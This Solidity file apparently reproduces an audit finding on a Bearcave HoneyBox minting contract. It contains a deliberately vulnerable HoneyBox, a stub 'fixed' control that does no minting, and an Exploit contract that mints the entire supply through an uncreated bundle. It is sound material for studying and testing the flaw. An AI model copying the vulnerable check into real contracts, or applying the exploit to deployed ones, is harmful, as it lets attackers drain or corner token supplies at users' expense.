// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Bearcave HoneyBox — Pashov, March 2023, C-03
    mekHoneyJarWithERC20 rejects a bundle only when publicMintTime is in
    the future. Bundle 0 was never created, so publicMintTime is 0 and
    0 > block.timestamp is false. bundleId 0 also equals the zeroed
    party.bundleId, so the identity check passes. The caller mints all
    100 HoneyJars in mintConfig before any game exists, paying 0.099 each.

    The control reverts when publicMintTime is 0.
*/

contract Pay {
    string public symbol = "OHM";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HoneyJar {
    string public symbol = "JAR";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract HoneyBox {
    struct MintConfig {
        uint32 maxHoneyJar;
        uint256 honeyJarPrice_ERC20;
    }

    struct SlumberParty {
        uint8 bundleId;
        uint256 publicMintTime;
        bool isAwake;
    }

    MintConfig public mintConfig;
    mapping(uint8 => SlumberParty) public slumberParties;
    mapping(uint8 => uint256) public minted;
    HoneyJar public immutable honey;
    Pay public immutable pay;
    uint256 public bundlesAdded;

    constructor(HoneyJar _honey, Pay _pay) {
        honey = _honey;
        pay = _pay;
        mintConfig = MintConfig(100, 0.099 ether);
    }

    function _canMintHoneyJar(uint8 bundleId_, uint256 amount_) internal view {
        SlumberParty storage party = slumberParties[bundleId_];
        require(party.bundleId == bundleId_, "InvalidBundle");
        require(minted[bundleId_] + amount_ <= mintConfig.maxHoneyJar, "MekingTooManyHoneyJars");
        require(amount_ > 0, "ZeroMint");
    }

    function mekHoneyJarWithERC20(uint8 bundleId_, uint256 amount_) external {
        _canMintHoneyJar(bundleId_, amount_);
        // @> VULN: an uncreated bundle has publicMintTime 0, so 0 > block.timestamp does not revert
        if (slumberParties[bundleId_].publicMintTime > block.timestamp) revert("GeneralMintNotOpen");
        uint256 cost = mintConfig.honeyJarPrice_ERC20 * amount_;
        pay.transferFrom(msg.sender, address(this), cost);
        honey.mint(msg.sender, amount_);
        minted[bundleId_] += amount_;
    }
}

contract HoneyBoxFixed {
    struct MintConfig {
        uint32 maxHoneyJar;
        uint256 honeyJarPrice_ERC20;
    }

    struct SlumberParty {
        uint8 bundleId;
        uint256 publicMintTime;
    }

    MintConfig public mintConfig;
    mapping(uint8 => SlumberParty) public slumberParties;
    HoneyJar public immutable honey;
    Pay public immutable pay;

    constructor(HoneyJar _honey, Pay _pay) {
        honey = _honey;
        pay = _pay;
        mintConfig = MintConfig(100, 0.099 ether);
    }

    function mekHoneyJarWithERC20(uint8 bundleId_, uint256 amount_) external {
        require(slumberParties[bundleId_].publicMintTime != 0, "NotSleeping");
        if (slumberParties[bundleId_].publicMintTime > block.timestamp) revert("GeneralMintNotOpen");
        honey;
        pay;
        amount_;
    }
}

contract Exploit {
    Pay public pay;
    HoneyJar public honey;
    HoneyBox public box;
    uint256 public mintedJars;
    bool public supplyClosed;

    constructor() {
        pay = new Pay();
        honey = new HoneyJar();
        box = new HoneyBox(honey, pay);
        pay.mint(address(this), 9.9 ether);
    }

    function run() external {
        pay.approve(address(box), 9.9 ether);
        (, uint256 openAt,) = box.slumberParties(0);
        require(openAt == 0, "no bundle");
        require(box.bundlesAdded() == 0, "no games");
        box.mekHoneyJarWithERC20(0, 100);
        mintedJars = honey.balanceOf(address(this));
        (uint32 maxJar,) = box.mintConfig();
        supplyClosed = box.minted(0) == maxJar;
        require(mintedJars == 100, "minted 100");
        require(supplyClosed, "max filled");
        require(pay.balanceOf(address(box)) == 9.9 ether, "paid 9.9");
        require(box.minted(0) + 1 > 100, "next player blocked");
    }
}
